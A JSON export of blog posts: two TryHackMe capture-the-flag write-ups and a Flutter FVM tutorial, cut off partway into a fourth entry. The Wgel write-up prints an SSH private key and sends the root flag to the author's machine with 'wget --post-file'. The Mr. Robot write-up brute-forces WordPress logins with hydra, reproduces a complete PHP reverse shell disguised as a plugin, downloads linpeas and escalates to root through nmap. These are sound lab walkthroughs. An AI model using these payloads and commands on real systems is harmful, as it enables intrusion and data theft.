[{"title":"Wgel - TryHackMe","date":"2020-08-07","categories":["pentesting","writeups"],"content":"\r\nHey there! Today I am going to walk you through the Wgel machine on [TryHackMe](https://tryhackme.com/room/wgelctf)\r\n\r\nThe first thing I always do is to export the IP to a global variable. So from now on \\$IP will refer to the IP of the target machine.\r\n\r\n```bash\r\nexport IP={Machine IP}\r\n```\r\n\r\n![test](\\Wgel-TryHackMe\\burp.png)\r\n![test](\\Wgel-TryHackMe\\burp.png)\r\n![test](\\Wgel-TryHackMe\\burp.png)\r\n\r\n![test](\\Wgel-TryHackMe\\flag2.2.png)\r\n\r\n## Enumeration\r\n\r\nLet us start our enumeration as usual and do an nmap scan:\r\n\r\n```bash\r\nnmap -T4 -A $IP\r\n```\r\n\r\nThis is what came back:\r\n\r\n```plain\r\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-08-07 09:47 EDT\r\nNmap scan report for 10.10.54.255\r\nHost is up (0.051s latency).\r\nNot shown: 998 closed ports\r\nPORT   STATE SERVICE VERSION\r\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\r\n| ssh-hostkey:\r\n|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)\r\n|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)\r\n|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)\r\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\r\n|_http-server-header: Apache/2.4.18 (Ubuntu)\r\n|_http-title: Apache2 Ubuntu Default Page: It works\r\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\r\nTCP/IP fingerprint:\r\nOS:SCAN(V=7.80%E=4%D=8/7%OT=22%CT=1%CU=42515%PV=Y%DS=2%DC=T%G=Y%TM=5F2D5B8F\r\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=RD%TS=A)SEQ(SP=1\r\nOS:05%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O\r\nOS:3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=\r\nOS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSN\r\nOS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D\r\nOS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O\r\nOS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W\r\nOS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R\r\nOS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\r\n\r\nNetwork Distance: 2 hops\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\r\n\r\nTRACEROUTE (using port 1720/tcp)\r\nHOP RTT      ADDRESS\r\n1   52.28 ms 10.9.0.1\r\n2   52.35 ms 10.10.54.255\r\n\r\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\r\nNmap done: 1 IP address (1 host up) scanned in 23.73 seconds\r\n```\r\n\r\nSo just SSH on port 22 and Apache on port 80. Let us first do some enumeration on the web server.<br/>On first glance there is just the Apache default page. If we have a look at the source code we can see that there is a comment inside:\r\n\r\n```html\r\n<!-- Jessie don't forget to udate the webiste -->\r\n```\r\n\r\nApparently someone called Jessie is a developer or user of the target machine.\r\n\r\nBut let us run dirbuster and see if there is more to find.\r\n\r\nAt **/sitemap/** there is a blog like website with the title ‚Äúunapp‚Äù but I did not find anything interesting there nor any exploits. So let us move on.\r\n\r\nWeirdly my scan did not find anything, but I poked around a bit more and just tried random directories and files. So I stumbled upon this: **/sitemap/.ssh/id_rsa**.\r\n\r\n```plain\r\n-----BEGIN RSA PRIVATE KEY-----\r\nMIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380\r\nm+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x\r\nW69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP\r\ny4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr\r\n+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH\r\nWo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG\r\n/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE\r\nAnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa\r\nM7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG\r\nSUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv\r\n2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2\r\np3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj\r\n7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I\r\ndcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy\r\nGW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh\r\nshl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97\r\nuhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N\r\nLaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u\r\nQJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW\r\nV35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5\r\nhRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr\r\n9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu\r\neyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb\r\nQNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg\r\njL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod\r\n-----END RSA PRIVATE KEY-----\r\n```\r\n\r\nIt is an SSH private key you can use to login to someones SSH.<br/>I went ahead and copied the key to a file called **id_rsa** and gave it the permissions SSH likes.\r\n\r\n```bash\r\nchmod 600 id_rsa\r\n```\r\n\r\n## Gaining Access\r\n\r\nNow we can use that previously found key to login to SSH. The only thing we are missing is a user to map that key to. In this case the server would be even vulnerable to an exploit to enumerate all the users on a server, but because we found something for ‚ÄúJessie‚Äù earlier, I assumed, that the key was Jessie‚Äôs.<br/>So let‚Äôs login as Jessie with the private key.\r\n\r\n```bash\r\nssh -i id_rsa  jessie@$IP\r\n```\r\n\r\n### User Flag\r\n\r\nThe user flag was hidden inside of the ‚ÄúDocuments‚Äù directory.\r\n\r\n```bash\r\njessie@CorpOne:~$ ls\r\nDesktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos\r\n\r\njessie@CorpOne:~$ cd Desktop/\r\njessie@CorpOne:~/Desktop$ ls\r\n\r\njessie@CorpOne:~/Desktop$ cd ..\r\njessie@CorpOne:~$ cd Documents/\r\njessie@CorpOne:~/Documents$ ls\r\nuser_flag.txt\r\n\r\njessie@CorpOne:~/Documents$ cat user_flag.txt\r\nUSER_FLAG\r\n```\r\n\r\n## Post Exploitation & Getting Root\r\n\r\nBefore uploading linpeas or anything else I fancied, I just had a look at our sudo permissions myself.\r\n\r\n```plain\r\njessie@CorpOne:~/Documents$ sudo -l\r\nMatching Defaults entries for jessie on CorpOne:\r\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\r\n\r\nUser jessie may run the following commands on CorpOne:\r\n    (ALL : ALL) ALL\r\n    (root) NOPASSWD: /usr/bin/wget\r\n```\r\n\r\nInteresting, apparently we can run **wget** as root without a password. So as always I had a look at [GTFOBins](https://gtfobins.github.io/) and found [this](https://gtfobins.github.io/gtfobins/wget/) for wget.\r\n\r\n### Root Flag\r\n\r\nIt seems like we can download files to another machine. We can use that knowledge to directly exfiltrate the root flag.<br/>(Trust me it took me ages to figure that one out. I first tried to download /etc/shadow and simliar.)\r\n\r\nSo on my machine I listened for incoming connections on port 80 and stored the output in a file called ‚Äúroot_flag.txt‚Äù:\r\n\r\n```plain\r\nroot@hades      :~/ctf/thm/wgel# nc -lnvp 80 > root_flag.txt\r\nNcat: Version 7.80 ( https://nmap.org/ncat )\r\nNcat: Listening on :::80\r\nNcat: Listening on 0.0.0.0:80\r\nNcat: Connection from 10.10.54.255.\r\nNcat: Connection from 10.10.54.255:36442.\r\n```\r\n\r\nOn the target machine I used wget with the ‚Äú‚Äìpost-file‚Äù flag to send the root flag to my machine.\r\n\r\n```bash\r\njessie@CorpOne:~/Documents$ sudo /usr/bin/wget --post-file=/root/root_flag.txt $YOUR_IP\r\n--2020-08-07 18:11:21--  http://$YOUR_IP/\r\nConnecting to $YOUR_IP:80... connected.\r\nHTTP request sent, awaiting response...\r\n```\r\n\r\nYou should now be able to cat out the root flag in the ‚Äúroot_flag.txt‚Äù file.\r\n\r\n```bash\r\nroot@hades:~/ctf/thm/wgel# cat root_flag.txt\r\nROOT_FLAG\r\n```\r\n\r\n## The End\r\n\r\nAnd there you have it! I hope you had fun, I know I did ü¶Ñ\r\n","id":290021949059,"slug":"Wgel-TryHackMe"},{"title":"Mr. Robot CTF - TryHackMe","date":"2020-07-09","categories":["pentesting","writeups"],"content":"\r\nHey there! Today I am going to walk you through the Mr. Robot machine. I used the one on [TryHackMe](https://tryhackme.com/room/mrrobot), but it is available on [Vulnhub](https://www.vulnhub.com/entry/mr-robot-1,151/) as well.\r\n\r\nThe first thing I always do (thanks to John Hammond) is to export the IP to a global variable. So \\$IP will refer to the target machine from now on.\r\n\r\n```bash\r\nexport IP={Machine IP}\r\n```\r\n\r\n## Enumeration\r\n\r\nLet us start our enumeration as usual and do an nmap scan:\r\n\r\n```bash\r\nnmap -sC -sV -oN nmap/initial $IP\r\n```\r\n\r\nThis is what we are working with:\r\n\r\n```plain\r\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 11:13 EDT\r\nNmap scan report for 10.10.99.113\r\nHost is up (0.046s latency).\r\nNot shown: 997 filtered ports\r\nPORT    STATE  SERVICE  VERSION\r\n22/tcp  closed ssh\r\n80/tcp  open   http     Apache httpd\r\n|_http-server-header: Apache\r\n|_http-title: Site doesn't have a title (text/html).\r\n443/tcp open   ssl/http Apache httpd\r\n|_http-server-header: Apache\r\n|_http-title: 400 Bad Request\r\n| ssl-cert: Subject: commonName=www.example.com\r\n| Not valid before: 2015-09-16T10:45:03\r\n|_Not valid after:  2025-09-13T10:45:03\r\n\r\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\r\nNmap done: 1 IP address (1 host up) scanned in 41.08 seconds\r\n```\r\n\r\nWe can see that there is a webserver up but there is nothing interesting at first glance, just some stuff about the Mr. Robot series.<br/>Let‚Äôs run a dirbuster scan anyways.\r\n\r\n### Flag 1\r\n\r\nAlso let‚Äôs have a look at the robots.txt file, as the hint for the first key is ‚Äúrobots‚Äù.\r\n\r\n```plain\r\n# robots.txt\r\nUser-agent: *\r\nfsocity.dic\r\nkey-1-of-3.txt\r\n```\r\n\r\nThat seems interesting. We have the first key and we should probably also download the dictionary file. Maybe we will need it later.\r\n\r\n## Gaining Access\r\n\r\nMeanwhile, our dirbuster results should have come back. We can see a lot of folders and files relating to a WordPress installation probably for a blog. Especially interesting is the ‚Äúwp-login.php‚Äù file in the root of the webserver. Maybe we can get in that way with the credentials we downloaded earlier? Let us try that.<br/>I used hydra with the following syntax:\r\n\r\n```bash\r\nhydra -L fsocity.dic -p test $IP http-post-form \"/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F$IP%2Fwp-admin%2F&testcookie=1:F=Invalid username\"\r\n```\r\n\r\nBasically what we are doing is, we are trying to get the username from the .dic file. Luckily with WordPress, we can see whether the password or the username was wrong, so we first bruteforce the username and then the corresponding password.<br/>We are also telling hydra in which post parameter to insert the username and password. You can get the post parameters through burp suite.\r\n\r\n```plain\r\nHydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\r\n\r\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-08 11:20:46\r\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task\r\n[DATA] attacking http-post-form://$IP:80/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F$IP%2Fwp-admin%2F&testcookie=1:F=Invalid username\r\n[80][http-post-form] host: $IP  login: Elliot   password: test\r\n```\r\n\r\nSweet! Now we got the user: **Elliot**\r\n\r\nNext, let us try to get the password!\r\n\r\n```bash\r\nhydra -l Elliot -P fsocity.dic $IP http-post-form \"/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F$IP%2Fwp-admin%2F&testcookie=1:S=302\"\r\n```\r\n\r\nWe are using the same syntax as before but using ‚ÄúElliot‚Äù as the username and the .dic file as a wordlist for the password.\r\n\r\n```plain\r\nHydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\r\n\r\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-08 11:22:21\r\n[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1/p:10), ~1 try per task\r\n[DATA] attacking http-post-form://$IP:80/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F$IP%2Fwp-admin%2F&testcookie=1:S=302\r\n[...]\r\n[80][http-post-form] host: $IP   login: Elliot   password: ER28-0652\r\n```\r\n\r\nGreat! Now with the password (**ER28-0652**), it should be no problem to log in.\r\n\r\nOnce logged in we are greeted with the standard WordPress dashboard. Nothing has been done here, so it is quite empty. After looking around a bit I noticed that I could upload plugins. So why shouldn‚Äôt we upload our own special plugin üòÖ?\r\n\r\nI just used the standard [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) from pentestmonkey and modified it to my needs.\r\n\r\n```php\r\n<?php\r\n/*\r\nPlugin Name:  Shelldon\r\nPlugin URI: http://example.com\r\nDescription: Makes a Shelldon\r\nVersion: 1.0\r\nAuthor: me\r\nAuthor URI: http://www.me.com\r\nText Domain: revshell\r\nDomain Path: /languages\r\n*/\r\n// php-reverse-shell - A Reverse Shell implementation in PHP\r\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\r\n//\r\n// This tool may be used for legal purposes only.  Users take full responsibility\r\n// for any actions performed using this tool.  The author accepts no liability\r\n// for damage caused by this tool.  If these terms are not acceptable to you, then\r\n// do not use this tool.\r\n//\r\n// In all other respects the GPL version 2 applies:\r\n//\r\n// This program is free software; you can redistribute it and/or modify\r\n// it under the terms of the GNU General Public License version 2 as\r\n// published by the Free Software Foundation.\r\n//\r\n// This program is distributed in the hope that it will be useful,\r\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\r\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\n// GNU General Public License for more details.\r\n//\r\n// You should have received a copy of the GNU General Public License along\r\n// with this program; if not, write to the Free Software Foundation, Inc.,\r\n// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\r\n//\r\n// This tool may be used for legal purposes only.  Users take full responsibility\r\n// for any actions performed using this tool.  If these terms are not acceptable to\r\n// you, then do not use this tool.\r\n//\r\n// You are encouraged to send comments, improvements or suggestions to\r\n// me at pentestmonkey@pentestmonkey.net\r\n//\r\n// Description\r\n// -----------\r\n// This script will make an outbound TCP connection to a hardcoded IP and port.\r\n// The recipient will be given a shell running as the current user (apache normally).\r\n//\r\n// Limitations\r\n// -----------\r\n// proc_open and stream_set_blocking require PHP version 4.3+, or 5+\r\n// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.\r\n// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.\r\n//\r\n// Usage\r\n// -----\r\n// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.\r\n\r\nset_time_limit (0);\r\n$VERSION = \"1.0\";\r\n$ip = '';  // Your tun0 ip (ifconfig in terminal)\r\n$port = 9999;\r\n$chunk_size = 1400;\r\n$write_a = null;\r\n$error_a = null;\r\n$shell = 'uname -a; w; id; /bin/sh -i';\r\n$daemon = 0;\r\n$debug = 0;\r\n\r\n//\r\n// Daemonise ourself if possible to avoid zombies later\r\n//\r\n\r\n// pcntl_fork is hardly ever available, but will allow us to daemonise\r\n// our php process and avoid zombies.  Worth a try...\r\nif (function_exists('pcntl_fork')) {\r\n\t// Fork and have the parent process exit\r\n\t$pid = pcntl_fork();\r\n\r\n\tif ($pid == -1) {\r\n\t\tprintit(\"ERROR: Can't fork\");\r\n\t\texit(1);\r\n\t}\r\n\r\n\tif ($pid) {\r\n\t\texit(0);  // Parent exits\r\n\t}\r\n\r\n\t// Make the current process a session leader\r\n\t// Will only succeed if we forked\r\n\tif (posix_setsid() == -1) {\r\n\t\tprintit(\"Error: Can't setsid()\");\r\n\t\texit(1);\r\n\t}\r\n\r\n\t$daemon = 1;\r\n} else {\r\n\tprintit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\r\n}\r\n\r\n// Change to a safe directory\r\nchdir(\"/\");\r\n\r\n// Remove any umask we inherited\r\numask(0);\r\n\r\n//\r\n// Do the reverse shell...\r\n//\r\n\r\n// Open reverse connection\r\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\r\nif (!$sock) {\r\n\tprintit(\"$errstr ($errno)\");\r\n\texit(1);\r\n}\r\n\r\n// Spawn shell process\r\n$descriptorspec = array(\r\n   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\r\n   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\r\n   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\r\n);\r\n\r\n$process = proc_open($shell, $descriptorspec, $pipes);\r\n\r\nif (!is_resource($process)) {\r\n\tprintit(\"ERROR: Can't spawn shell\");\r\n\texit(1);\r\n}\r\n\r\n// Set everything to non-blocking\r\n// Reason: Occsionally reads will block, even though stream_select tells us they won't\r\nstream_set_blocking($pipes[0], 0);\r\nstream_set_blocking($pipes[1], 0);\r\nstream_set_blocking($pipes[2], 0);\r\nstream_set_blocking($sock, 0);\r\n\r\nprintit(\"Successfully opened reverse shell to $ip:$port\");\r\n\r\nwhile (1) {\r\n\t// Check for end of TCP connection\r\n\tif (feof($sock)) {\r\n\t\tprintit(\"ERROR: Shell connection terminated\");\r\n\t\tbreak;\r\n\t}\r\n\r\n\t// Check for end of STDOUT\r\n\tif (feof($pipes[1])) {\r\n\t\tprintit(\"ERROR: Shell process terminated\");\r\n\t\tbreak;\r\n\t}\r\n\r\n\t// Wait until a command is end down $sock, or some\r\n\t// command output is available on STDOUT or STDERR\r\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\r\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\r\n\r\n\t// If we can read from the TCP socket, send\r\n\t// data to process's STDIN\r\n\tif (in_array($sock, $read_a)) {\r\n\t\tif ($debug) printit(\"SOCK READ\");\r\n\t\t$input = fread($sock, $chunk_size);\r\n\t\tif ($debug) printit(\"SOCK: $input\");\r\n\t\tfwrite($pipes[0], $input);\r\n\t}\r\n\r\n\t// If we can read from the process's STDOUT\r\n\t// send data down tcp connection\r\n\tif (in_array($pipes[1], $read_a)) {\r\n\t\tif ($debug) printit(\"STDOUT READ\");\r\n\t\t$input = fread($pipes[1], $chunk_size);\r\n\t\tif ($debug) printit(\"STDOUT: $input\");\r\n\t\tfwrite($sock, $input);\r\n\t}\r\n\r\n\t// If we can read from the process's STDERR\r\n\t// send data down tcp connection\r\n\tif (in_array($pipes[2], $read_a)) {\r\n\t\tif ($debug) printit(\"STDERR READ\");\r\n\t\t$input = fread($pipes[2], $chunk_size);\r\n\t\tif ($debug) printit(\"STDERR: $input\");\r\n\t\tfwrite($sock, $input);\r\n\t}\r\n}\r\n\r\nfclose($sock);\r\nfclose($pipes[0]);\r\nfclose($pipes[1]);\r\nfclose($pipes[2]);\r\nproc_close($process);\r\n\r\n// Like print, but does nothing if we've daemonised ourself\r\n// (I can't figure out how to redirect STDOUT like a proper daemon)\r\nfunction printit ($string) {\r\n\tif (!$daemon) {\r\n\t\tprint \"$string\\n\";\r\n\t}\r\n}\r\n\r\n?>\r\n```\r\n\r\nWe need this part at the top:\r\n\r\n```php\r\n/*\r\nPlugin Name:  Shelldon\r\nPlugin URI: http://example.com\r\nDescription: Makes a Shelldon\r\nVersion: 1.0\r\nAuthor: me\r\nAuthor URI: http://www.me.com\r\nText Domain: revshell\r\nDomain Path: /languages\r\n*/\r\n```\r\n\r\nI honestly don‚Äôt know what it does exactly but it makes it look like a WordPress plugin and only that way we can upload it.\r\n\r\nSo let‚Äôs do just that, upload our plugin, but don‚Äôt activate it yet. Before that, we have to listen for incoming connections with netcat on our machine.\r\n\r\n```bash\r\nnc -lnvp 9999\r\n```\r\n\r\nNow if we activate the plugin in the WordPress interface, the page should be stuck in a loading loop, and we should have a reverse shell in the terminal we started the netcat listener in.\r\n\r\nThis shell is not really stable and we can‚Äôt use our arrows or autocomplete, so I am going to be using some poor man‚Äôs pentest and use the stabilizeshell.sh script. (If you don‚Äôt know what I am talking about, check out this video [here](https://www.youtube.com/watch?v=f2aSXGbD0NE))<br/>That way we can use all the nice features of a shell.\r\n\r\n## Post Exploitation\r\n\r\n### Flag 2\r\n\r\nWith the new shell we can also easily see that we are connected as the ‚Äúdaemon‚Äù user, so let‚Äôs see if we have some home directories.\r\n\r\n```bash\r\ndaemon@linux:/$ cd home/\r\ndaemon@linux:/home$ ls\r\nrobot\r\ndaemon@linux:/home$ cd robot/\r\ndaemon@linux:/home/robot$ ls\r\nkey-2-of-3.txt\tpassword.raw-md5\r\n```\r\n\r\nWe can see that there is another user called ‚Äúrobot‚Äù on this machine and he has a home. In there he has to files. A key, which we can sadly not cat out because it is owned by ‚Äúrobot‚Äù. So we do not have access to it. But there is something else interesting.<br/>An md5 hash of a password, which we luckily can cat out.\r\n\r\n```bash\r\ndaemon@linux:/home/robot$ cat password.raw-md5\r\nrobot:c3fcd3d76192e4007dfb496cca67e13b\r\n```\r\n\r\nI was too lazy to do anything fancy in hashcat or john, so I just used [crackstation.net](https://crackstation.net/), it gives us the result way faster:\r\n\r\n{% asset_img crackstation.png %}\r\n\r\nNow that we have his credentials, let‚Äôs login as ‚Äúrobot‚Äù\r\n\r\n```bash\r\nsu robot\r\n```\r\n\r\n(And of course type in the password we just found)\r\n\r\nCool, we are now ‚Äúrobot‚Äù, means that we now have access to the second key.\r\n\r\n```bash\r\ndaemon@linux:/home/robot$ cat key-2-of-3.txt\r\nkey2\r\n```\r\n\r\n## Getting Root\r\n\r\nNow that we have a user with more privileges we should try and get ourselves root. For that, I got [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) on the target machine.<br/>I did that by using my machine as a server and downloading linpeas from my machine. (You could also just directly download linpeas to be honest but I did it that way)\r\n\r\nTo open up the server (Do that on **your** computer):\r\n\r\n```python\r\npython3 -m http.server\r\n```\r\n\r\nDownload files (Do that on the **target** machine):\r\n\r\n```bash\r\ncd /dev/shm/\r\nwget \"$YOURIP:8000/linpeas.sh\"\r\n```\r\n\r\n(\\$YOURIP is your tun0 ip that shows up if you run ifconfig)\r\n\r\nNow mark linpeas.sh as an executable\r\n\r\n```bash\r\nchmod +x linpeas.sh\r\n```\r\n\r\nAnd run and save it\r\n\r\n```bash\r\n./linpeas.sh | tee linout.txt\r\n```\r\n\r\nAs usual, linpeas found a shitload of things but something that stood out to me was the ‚Äúnmap‚Äù entry in the SUID section.\r\n\r\nA quick search on [GTFOBins](https://gtfobins.github.io/) shows us that a root shell is just a few lines of code away.\r\n\r\n{% asset_img gtfobins.png %}\r\n\r\nI used the second option, so spawn an interactive nmap shell and get a root shell.\r\n\r\n```plain\r\nnmap --interactive\r\nnmap> !sh\r\n```\r\n\r\nAnd there you go, you have a root shell! I didn‚Äôt stabilize it this time, just because we don‚Äôt work in it very long.\r\n\r\n### Flag 3\r\n\r\nNow we can have a look inside of the /root/ directory and we see the third key.\r\n\r\n```plain\r\n# whoami\r\nroot\r\n# pwd\r\n/root/\r\n# cat key-3-of-3.txt\r\nkey3\r\n```\r\n\r\n## The End\r\n\r\nAnd there you have it! I hope you had fun, I know I did ü¶Ñ\r\n","id":161949306400,"slug":"Mr.-Robot-CTF-TryHackMe"},{"title":"How to use FVM","date":"2020-10-26","categories":["flutter","tools"],"content":"\nHello everyone and welcome back to another video. Today we will be having a look at Flutter Version Management. If you want to follow along more slowly have a look at the writeup of this video on my blog, I will have it linked in the video description. And now, let's get right to it.\n\nAlso if you enjoy my content maybe consider subscribing and liking to help me making more videos just like this one.\n\nLet's just quickly recap what FVM actually does. It allows you to install multiple versions of Flutter side by side. This can be very useful whenever you are working on multiple projects with different Flutter versions or when you are contributing to an open source project that uses a specific version of Flutter.\nFVM is open source, link to the GitHub is in the description, and features both a GUI as well as a command line interface. In this video I will only cover the CLI as the GUI is still in alpha and has not worked for me very well anyways.\n\nTo use the version manager you will need to have either Dart as a standalone tool or Flutter installed, which has Dart bundled since the 1.19.0 dev release.\nYou can test if you have Dart installed by typing `dart` into a terminal and pressing enter. It should return anything but something along the lines \"dart\" is not a command.\n\nTo then install FVM run:\n\n```\npub global activate fvm\n```\n\nOn Windows you may need to add a path to your path environment variable but it should tell you if that is needed.\n\nTo see all the versions you can install run:\n\n```\nfvm releases\n```\n\nAnd to see all the versions you have installed already run:\n\n```\nfvm list\n```\n\nSo let's install our first version.\nWe can either install a specific version, like 1.22.0 or we can install the head of a branch, like stable or dev.\nTo do that we want to run\n\n```\nfvm [version]\n```\n\nSo to install the stable release of Flutter we would have to run:\n\n```\nfvm install stable\n```\n\nAnd let's also install the dev release:\n\n```\nfvm install dev\n```\n\nI want the stable version to be my default and global version. FVM allows us to do that with the \"use\" command and the \"--global\" flag. \"use\" just tells FVM that we now give it a version we want to use and the \"--global\" flag tells it that we want to use this version system-wide. So let's run\n\n```\nfvm use stable --global\n```\n\nWe will also have to add this folder to our path. Of course this is different for every OS.\nFor the default location of FVM on Windows this is the folder: **\"C:\\Users\\[USERNAME]\\fvm\\default\\bin\"**.\nThis is the folder where the global version is located.\n\nBut normally we would only change the version for every separate project.\n\nTo demonstrate that I will create a new project with \"flutter create\" and move into it with \"cd\".\n(Also notice that when I run \"flutter --version\", it will return the version we set as a default version.)\n\nThis project now uses Flutter version 1.22.0 as this is the stable version at the time of this recording. But maybe you want to use Flutter Web and for that you need the Flutter dev branch.\nWith FVM we can simply type\n\n```\nfvm use dev\n```\n\nas to before where we had to change up our environment variables every time we want to switch our Flutter versions.\nNow let's also have a look at the folders of our project. We can see that in it is a hidden folder called \".fvm\". In there is a link to the current Flutter version for this project and a .json file with some information for the FVM CLI.\nTo access the Flutter version of this project (remember we set it to \"dev\"), in the terminal we have to append \"fvm\" in the front of every command.\nSo the normal\n\n```\nflutter run\n```\n\nnow looks like this:\n\n```\nfvm flutter run\n```\n\nThis is a bit annoying at first but either you live with it and you get used to it or you set up some aliases for some commands.\n\nBut this brings up another problem. How should our IDE or text editor know which Flutter version to use?\nWe just point it to the link in the \".fvm\" folder I mentioned earlier.\n\nI will show it based on VS Code because I think it is the primary editor for most of us.\nFirst open up the settings.json file and make sure that there is no \"dart.flutterSdkPaths\" or \"dart.flutterSdkPath\" entry. If there are, make sure to delete them first before you continue.\nThen add these lines:\n\n```json\n\"dart.flutterSdkPaths\": [\n  \".fvm/flutter_sdk\"\n],\n```\n\nYou may also need to add a comma to the line above if there isn't already.\nThis now always makes sure VS Code uses the Flutter version of this project to run your project etc..\n\nAnd that's it for this video! Thank you so much for watching and if you have any questions feel free to ask in the comments below. And till then, see you next time. :)\n","id":43676423450,"slug":"How-to-use-FVM"},{"title":"Flutter 